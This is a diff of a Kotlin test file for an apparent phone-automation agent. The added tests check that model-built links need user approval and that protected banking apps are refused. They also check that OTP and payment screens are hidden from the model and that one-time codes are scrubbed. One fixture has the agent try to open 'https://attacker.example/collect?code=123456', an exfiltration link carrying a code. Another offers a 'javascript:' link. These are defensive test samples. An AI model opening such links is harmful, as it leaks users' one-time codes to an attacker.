@@ -27,8 +27,10 @@ class StepLoopTest {
             sub: SubTask = SubTask("add a biryani to the cart", Kind.PHONE, "food_delivery", FOOD),
             earlier: List<String> = emptyList(),
             budget: Budget = Budget(60, 600_000, { clock.get() }),
+            task: String = "",
+            apps: List<AppInfo> = FAKE_APPS,
         ): StepLoop.Result = runBlocking {
-            loop.run(StepLoop.Input("r1", 0, sub, earlier, driver, Approvals({ clock.get() }), FAKE_APPS, budget, { lines += it }))
+            loop.run(StepLoop.Input("r1", 0, sub, earlier, driver, Approvals({ clock.get() }), apps, budget, { lines += it }, task = task))
         }
     }
 
@@ -387,8 +389,9 @@ class StepLoopTest {
         assertTrue(d.actions.none { it.startsWith("open:") })
     }
 
-    @Test fun anAllowedLinkIsOpenedAndAForbiddenOneIsNot() {
-        val s = Setup()
+    @Test fun anAllowedLinkIsOpenedAfterTheirYesAndAForbiddenOneIsNot() {
+        val gate = FakeGate(answer = { true })
+        val s = Setup(gate = gate)
         s.brain.reply(
             step("open_link", text = "https://example.com/menu"),
             step("open_link", text = "javascript:alert(1)"),
@@ -397,6 +400,91 @@ class StepLoopTest {
         )
         s.run()
         assertEquals(listOf("https://example.com/menu", "geo:0,0?q=biryani"), s.driver.links.toList())
+        assertEquals("the link is sent to the package that was checked", listOf(BROWSER, BROWSER), s.driver.linkPackages.toList())
+        assertTrue("the full link is in the question", gate.prompts.first().action.contains("https://example.com/menu"))
+    }
+
+    @Test fun aLinkTheModelBuiltIsNotOpenedWhenTheyDeclineAndTheRunStops() {
+        val s = Setup()
+        s.brain.reply(step("open_link", text = "https://attacker.example/collect?code=123456"))
+        val r = s.run()
+        assertEquals(StepLoop.End.STOPPED, r.end)
+        assertTrue(s.driver.links.isEmpty())
+        assertTrue(s.gate.prompts.single().action.contains("https://attacker.example/collect?code=123456"))
+    }
+
+    @Test fun aLinkTheyWroteInTheTaskAndWhoseAppIsApprovedNeedsNoQuestion() {
+        val s = Setup()
+        s.driver.linkTargetOf = { FOOD }
+        s.brain.reply(step("open_link", text = "https://food.example/menu"), step("done", text = "ok"))
+        s.run(task = "open https://food.example/menu for me")
+        assertEquals(listOf("https://food.example/menu"), s.driver.links.toList())
+        assertEquals(listOf(FOOD), s.driver.linkPackages.toList())
+        assertTrue(s.gate.prompts.isEmpty())
+    }
+
+    @Test fun aLinkNoSingleAppOpensIsRefusedAndNothingIsStarted() {
+        val s = Setup()
+        s.driver.linkTargetOf = { "" }
+        s.brain.reply(step("open_link", text = "https://example.com"), step("done", text = "ok"))
+        s.run(task = "https://example.com")
+        assertTrue(s.driver.links.isEmpty())
+        assertEquals(Verdict.REFUSED, s.lines[0].verdict)
+        assertTrue(s.lines[0].result, s.lines[0].result.contains("no single app opens this link"))
+    }
+
+    @Test fun aLinkWhoseHandlerIsAProtectedAppByLabelIsRefused() {
+        val apps = FAKE_APPS + AppInfo("com.example.pay", "Bank Pay")
+        val s = Setup()
+        s.driver.linkTargetOf = { "com.example.pay" }
+        s.brain.reply(step("open_link", text = "https://example.com"), step("done", text = "ok"))
+        s.run(task = "https://example.com", apps = apps)
+        assertTrue(s.driver.links.isEmpty())
+        assertTrue(s.lines[0].result, s.lines[0].result.contains("protected"))
+    }
+
+    // ------------------------------------------------------------ what the model is shown (C7) and which apps are protected by label (C9)
+
+    @Test fun c7_theModelIsShownNothingOfAProtectedAppAndCannotActThere() {
+        val d = FakeFoodDriver().also { it.otherScreen = raw(text("Balance 12,345", 100), button("Send money", 300), pkg = "com.phonepe.app") }
+        val s = Setup(driver = d)
+        s.brain.replyWith({ step("tap", id = 1) }, { step("done", text = "ok") })
+        s.run(sub = SubTask("g", Kind.PHONE))
+        val shown = s.brain.calls[0].user.substringAfter(StepLoop.FENCE_OPEN).substringBefore(StepLoop.FENCE_CLOSE)
+        assertTrue(shown, shown.contains("Ustaad does not read it"))
+        assertFalse(s.brain.calls.any { it.user.contains("Balance") || it.user.contains("Send money") })
+        assertEquals(Verdict.REFUSED, s.lines[0].verdict)
+        assertTrue(d.taps.isEmpty())
+    }
+
+    @Test fun c7_aScreenThatAsksForACodeIsNotShownToTheModelEither() {
+        val d = FakeFoodDriver().also { it.otherScreen = raw(text("Enter the OTP sent to 98xxxxxx10", 100), rn(cls = "android.widget.EditText", hint = "OTP", editable = true, l = 40, t = 300, r = 1040, b = 400), pkg = FOOD) }
+        val s = Setup(driver = d)
+        s.brain.reply(step("done", text = "stuck"))
+        s.run()
+        assertFalse(s.brain.calls[0].user.contains("Enter the OTP"))
+        assertTrue(s.brain.calls[0].user.contains("Ustaad does not read it"))
+    }
+
+    @Test fun c7_aCodeOnTheScreenIsNeverInThePromptAndADoneAnswerThatRepeatsItIsScrubbed() {
+        val d = FakeFoodDriver().also { it.otherScreen = raw(text("Your code is 482913", 100), button("Add", 300), pkg = FOOD) }
+        val s = Setup(driver = d)
+        s.brain.reply(step("done", text = "the code is 482913"))
+        val r = s.run()
+        assertFalse(s.brain.calls[0].user.contains("482913"))
+        assertTrue(s.brain.calls[0].user.contains("Your code is ****"))
+        assertEquals("the code is ****", r.outcome)
+        assertEquals("the code is ****", s.lines.last().result)
+    }
+
+    @Test fun c9_aSubtaskInAnAppWhoseLabelIsBankFailsAtTheOpeningAndNothingIsOpened() {
+        val apps = FAKE_APPS + AppInfo("com.example.cash", "Bank")
+        val d = FakeFoodDriver(foreground = LAUNCHER)
+        val s = Setup(driver = d)
+        val r = s.run(sub = SubTask("check my cash", Kind.PHONE, "", "com.example.cash"), apps = apps)
+        assertEquals(StepLoop.End.FAILED, r.end)
+        assertTrue(r.outcome, r.outcome.contains("could not open") && r.outcome.contains("protected"))
+        assertTrue(d.actions.none { it.startsWith("open:") })
     }
 
     // ------------------------------------------------------------ the hostile screen (S1, S3)
